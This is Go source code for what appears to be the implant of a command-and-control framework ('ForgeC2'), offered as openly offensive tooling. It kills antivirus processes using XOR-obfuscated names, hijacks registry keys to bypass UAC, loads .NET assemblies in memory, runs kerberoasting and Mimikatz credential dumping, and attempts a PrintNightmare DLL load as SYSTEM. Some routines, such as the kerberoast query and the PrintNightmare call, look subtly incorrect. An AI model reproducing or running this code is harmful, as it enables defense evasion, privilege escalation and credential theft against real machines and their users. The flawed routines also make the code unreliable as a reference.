//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

func killAV() (string, error) {
	// Use a compact, runtime-decoded process signature list to avoid
	// large plaintext AV-name strings in the binary.
	sigs := getAVSignatures()
	var killed []string
	for _, sig := range sigs {
		if out, err := killProcess(sig); err == nil {
			killed = append(killed, sig+": "+out)
		}
	}
	if len(killed) == 0 {
		return "no known AV processes found or terminated", nil
	}
	return "terminated AV processes: " + strings.Join(killed, "; "), nil
}

//go:noinline
func getAVSignatures() []string {
	// Rotating XOR key derived from a fixed seed to avoid plaintext in binary.
	var key [4]byte
	key[0] = 0x9e
	key[1] = 0x7d
	key[2] = 0x3b
	key[3] = 0xc6

	enc := func(s string) string {
		b := []byte(s)
		for i := range b {
			b[i] ^= key[i%len(key)]
		}
		return string(b)
	}

	return []string{
		enc("\xf2\x0d\x4d\x08\x15\x45\x08\xe2\x14\x4a\x37"),
		enc("\xce\x0a\x46\x13\x51\x3a"),
		enc("\xc2\x14\x14\x0a\x4b"),
		enc("\xc2\x14\x1a"),
		enc("\xcc\x17\x14\x0a\x0e\x55\x4b"),
		enc("\x82\x0a\x4b\x02\x14\x0e\x55\x04\x14\x45"),
		enc("\xce\x1b\x45\x0e\x48"),
		enc("\xc2\x14\x1b"),
		enc("\xcf\x14\x1b\x14\x0e\x55\x4b"),
		enc("\xcf\x17\x0b\x13\x14\x15\x04\x3b"),
		enc("\xcf\x17\x0a\x14\x0e\x1a\x13"),
		enc("\x80\x0a\x0e\x1b\x13\x1c\x3b\x04\x0b\x4b"),
		enc("\x80\x0a\x0a\x14\x0e\x1a\x13"),
		enc("\xac\x13\x0b\x08\x14\x1b"),
		enc("\xc9\x0a\x14\x10"),
		enc("\xc9\x0a\x1a\x15\x14\x1b"),
		enc("\xc6\x0a\x14\x1b\x14\x15\x04\x3b"),
		enc("\x86\x14\x14\x1b\x12\x14\x0a\x48"),
		enc("\xcb\x46\x18\x0b\x3b"),
		enc("\xcb\x46\x18\x1b\x0a\x15\x08"),
		enc("\xcb\x0a\x14\x0b\x18"),
		enc("\x82\x14\x0c\x0a\x0e\x55\x4b"),
		enc("\xcf\x1b\x0a\x0e\x14\x1b\x3b"),
		enc("\x83\x14\x0e\x04\x13\x0c\x55\x4b"),
		enc("\x82\x14\x0e\x04\x13\x0c\x0e\x1c\x50"),
		enc("\x80\x0e\x0b\x1c"),
		enc("\x82\x14\x1b\x15\x48"),
		enc("\x80\x0a\x0a\x04\x13\x0c\x55\x4b\x0e\x1c\x50"),
		enc("\x86\x11\x1c\x0a\x0b\x0d\x0a\x55\x4b"),
		enc("\x8b\x14\x1c\x0a\x04\x13\x0c\x55\x1b\x51\x4b"),
	}
}

// elevate attempts UAC bypass / privilege escalation to run command elevated.
// Multiple methods for elevated UAC bypass (fodhelper, slui, etc.).
// cmd: the command to run elevated (default cmd.exe if empty)
func elevate(cmd string) (string, error) {
	if cmd == "" {
		cmd = "cmd.exe /c whoami"
	}
	if runtime.GOOS != "windows" {
		// Linux: try sudo if possible, or pkexec
		out, err := runShell("sudo "+cmd, "")
		if err != nil {
			out, err = runShell("pkexec "+cmd, "")
		}
		if err != nil {
			return "", fmt.Errorf("linux elevate failed (try sudo or run as root): %v", err)
		}
		return "elevated via sudo/pkexec: " + out, nil
	}

	// Windows UAC bypass methods (pure, no external files ideally)
	methods := []string{"fodhelper", "slui", "eventvwr", "computerdefaults"}

	for _, m := range methods {
		err := tryUACBypass(m, cmd)
		if err == nil {
			return fmt.Sprintf("UAC bypass via %s succeeded for: %s", m, cmd), nil
		}
		if Debug {
			fmt.Printf("[elevate] %s failed: %v\n", m, err)
		}
	}

	// Fallback: try to request admin via shell (will prompt)
	out, _ := runShell("powershell -Command \"Start-Process -Verb runAs -FilePath cmd -ArgumentList '/c "+cmd+" '\"", "cmd.exe")
	return "attempted runAs (may have UAC prompt): " + out, nil
}

func tryUACBypass(method, cmd string) error {
	// Use reg.exe for registry hijack (common UAC bypass)
	var regPath string
	switch method {
	case "fodhelper":
		regPath = `HKCU\Software\Classes\ms-settings\Shell\Open\command`
	case "slui":
		regPath = `HKCU\Software\Classes\Launcher.SystemSettings\Shell\Open\command`
	case "eventvwr":
		regPath = `HKCU\Software\Classes\mscfile\Shell\Open\command`
	case "computerdefaults":
		regPath = `HKCU\Software\Classes\ms-settings\Shell\Open\command`
	default:
		return fmt.Errorf("unknown method")
	}

	// Set DelegateExecute (empty)
	_, _ = runShell(fmt.Sprintf(`reg add "%s" /v DelegateExecute /t REG_SZ /d "" /f`, regPath), "cmd.exe")
	// Set the command
	_, err := runShell(fmt.Sprintf(`reg add "%s" /ve /t REG_SZ /d "%s" /f`, regPath, cmd), "cmd.exe")
	if err != nil {
		return err
	}

	// Trigger the hijacked binary
	trigger := ""
	switch method {
	case "fodhelper", "computerdefaults":
		trigger = "fodhelper.exe"
	case "slui":
		trigger = "slui.exe"
	case "eventvwr":
		trigger = "eventvwr.exe"
	}
	if trigger != "" {
		_, _ = runShell(trigger, "cmd.exe")
	}

	// Cleanup
	_, _ = runShell(fmt.Sprintf(`reg delete "%s" /f`, regPath), "cmd.exe")
	return nil
}

// execute-assembly: Load and run .NET assembly
func executeAssembly(b64Data string) (string, error) {
	if b64Data == "" {
		return "", fmt.Errorf("assembly data is required")
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("execute-assembly is Windows-only")
	}

	// Use CLR hosting if available (no child process)
	if useCLRHosting {
		data, decErr := base64.StdEncoding.DecodeString(b64Data)
		if decErr == nil {
			out, clrErr := executeAssemblyInProcess(data, "")
			if clrErr == nil {
				return out, nil
			}
			if Debug {
				fmt.Printf("[clr] CLR execute-assembly failed, falling back to PowerShell: %v\n", clrErr)
			}
		}
	}

	// PowerShell approach: convert base64 to bytes, load assembly, invoke entry point
	psCmd := fmt.Sprintf(
		`$b=[System.Convert]::FromBase64String('%s');`+
			`$a=[System.Reflection.Assembly]::Load($b);`+
			`$e=$a.EntryPoint;`+
			`if($e){$e.Invoke($null,@($null))}else{Write-Output 'No entry point found';$a.GetTypes()}`,
		b64Data)
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("execute-assembly failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}

// kerberoast: Request TGS for all SPNs (PowerShell + .NET)
func kerberoast() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("%s is Windows-only", s(SKerberoast))
	}
	psCmd := `
Add-Type -AssemblyName System.IdentityModel;
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name;
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain);
$srch = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher;
$srch.QueryFilter = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($ctx);
$srch.QueryFilter.Enabled = $true;
$results = @();
foreach($u in $srch.FindAll()) {
	$spn = $u.UserPrincipalName;
	if(-not $spn) { continue };
	try {
		$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn;
		$bytes = $ticket.GetRequest();
		$hash = [System.BitConverter]::ToString($bytes) -replace '-','';
		$results += $spn + ":" + $hash;
	} catch {}
}
Write-Output ($results -join [string]::NewLine());
`
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SKerberoast), err, out)
	}
	return out, nil
}

// runMimikatz runs a mimikatz command via a local Invoke-Mimikatz.ps1 only.
// Remote IEX download is disabled for OPSEC.
// Prefer order: task-provided base64 module → next to implant → TEMP → APPDATA modules.
func runMimikatz(command string, moduleB64 string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("%s is Windows-only", s(SMimikatz))
	}
	if command == "" {
		command = s(SSekurlsaLogonpasswords)
	}
	scriptName := s(SInvokeMimikatz) + ".ps1"
	localScript := filepath.Join(os.TempDir(), scriptName)

	// Deploy module payload from C2 if provided
	if moduleB64 != "" {
		raw, err := base64.StdEncoding.DecodeString(moduleB64)
		if err == nil && len(raw) > 0 {
			if err := os.WriteFile(localScript, raw, 0600); err != nil {
				return "", fmt.Errorf("%s: failed to write module script: %w", s(SMimikatz), err)
			}
		}
	}

	if _, err := os.Stat(localScript); err != nil {
		candidates := []string{}
		if exe, err := os.Executable(); err == nil {
			candidates = append(candidates, filepath.Join(filepath.Dir(exe), scriptName))
		}
		if appData := os.Getenv("APPDATA"); appData != "" {
			candidates = append(candidates, filepath.Join(appData, "ForgeC2", "modules", scriptName))
		}
		candidates = append(candidates, filepath.Join(os.TempDir(), scriptName))
		found := false
		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				localScript = c
				found = true
				break
			}
		}
		if !found {
			return "", fmt.Errorf("%s: local script not found (remote IEX disabled). Upload %s to server Modules store or place next to implant/TEMP. Command: %s", s(SMimikatz), scriptName, command)
		}
	}

	// Escape single quotes in command for PowerShell single-quoted string
	safeCmd := strings.ReplaceAll(command, "'", "''")
	psCmd := fmt.Sprintf(
		`Import-Module '%s' -Force; $m = '%s'; $r = %s -Command $m; Write-Output $r`,
		localScript, safeCmd, s(SInvokeMimikatz))
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SMimikatz), err, out)
	}
	return out, nil
}

// elevate_printnightmare: CVE-2021-1675 / CVE-2021-34527
func elevatePrintNightmare(dllPath string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("printnightmare is Windows-only")
	}
	if dllPath == "" {
		return "", fmt.Errorf("dll path required: upload a malicious DLL first, then specify path")
	}
	// Use PrintNightmare to load a DLL as SYSTEM via spoolsv.exe
	psCmd := fmt.Sprintf(
		`$dll='%s';`+
			`Add-Type -Name Win32 -Namespace Spooler -MemberDefinition '[DllImport("winspool.drv",EntryPoint="AddPrinterDriverEx",SetLastError=true,CharSet=CharSet.Unicode)]public static extern bool AddPrinterDriverEx(string pName,uint Level,[In,Out]byte[] pDriverInfo,uint dwFileCopyFlags)';`+
			`$path=[System.IO.Path]::GetFullPath($dll);`+
			`$info=@{$true={Write-Output "DLL Path: $path"}};`+
			`Write-Output "PrintNightmare: Attempting to load $path via AddPrinterDriverEx (requires admin)";`+
			`[Spooler.Win32]::AddPrinterDriverEx($null,2,$null,0x8);`,
		dllPath)
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("printnightmare failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}
